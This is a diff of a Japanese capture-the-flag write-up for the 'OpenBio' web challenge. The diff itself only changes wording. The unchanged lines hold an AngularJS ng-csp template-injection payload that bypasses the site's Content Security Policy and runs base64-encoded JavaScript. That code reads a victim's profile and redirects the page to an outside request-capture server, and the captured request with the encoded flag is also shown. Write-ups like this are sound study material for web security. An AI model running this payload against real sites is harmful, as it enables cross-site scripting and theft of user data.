@@ -27,7 +27,7 @@ satoki - OpenBio
 zunda</p>
 ~~~
 ```
-明らかにテスト時の解答が残っており、angularのCSPバイパスが見える。  
+明らかにテスト時のペイロードが残っており、angularのCSPバイパスが見える。  
 base64されたコードがあるので、デコードすると以下のようになった。  
 ```javascript
 $(document).ready(function() {
@@ -44,14 +44,14 @@ $(document).ready(function() {
 });
 ```
 `http://ponponmaru.tk:18002/`にbioを送信している。  
-ここを自身のサーバに変え、base64で再びエンコードしプロフィールに設定する。  
-投稿するものは以下になる(サーバは[RequestBin.com](https://requestbin.com/)を用いた)。  
+ここを自身のサーバに変えたものを、プロフィールに設定する。  
+投稿するペイロードは以下になる(サーバは[RequestBin.com](https://requestbin.com/)を用いた)。  
 ```html
 <script src="https://cdn.jsdelivr.net/npm/angular@1.8.3/angular.min.js"></script>
 <div ng-app ng-csp>{{$eval.constructor('eval(atob("CiQoZG9jdW1lbnQpLnJlYWR5KGZ1bmN0aW9uKCkgewogICQuZ2V0KCcvJywgKGRhdGEpID0+IHsKICAgIGxldCByeCA9IC88dGV4dGFyZWEgY2xhc3MuKz4oLiopPFwvdGV4dGFyZWE+L2c7CiAgICBsZXQgYXJyID0gcnguZXhlYyhkYXRhKTsKICAgIGxldCBiaW8gPSBhcnJbMV07CiAgICBpZiAoYmlvLmluZGV4T2YoImZsYWciKSAhPT0gLTEpIHsKICAgICAgbG9jYXRpb24uaHJlZiA9ICJodHRwczovL3h4eHh4eHh4eHh4eHgueC5waXBlZHJlYW0ubmV0Lz94PSIgKyBidG9hKGJpbyk7CiAgICB9IGVsc2UgewogICAgICBhbGVydCgiUmVwb3J0IG1lIik7CiAgICB9CiAgfSk7Cn0pOwo="))')()}}</div>
 satoki
 ```
-プロフィールを報告すると以下のリクエストが自身のサーバに届いた。  
+その後、プロフィールを報告すると以下のリクエストが自身のサーバに届いた。  
 ```
 GET
 /?x=WW91IGhhY2tlZCBtZSEgVGhlIGZsYWcgaXMgQ2FrZUNURntodHRwb25seT10cnVlX2QwM3NfbjB0X3ByMHQzY3RfVV8xbl9tNG55X2M0czNzIX0=
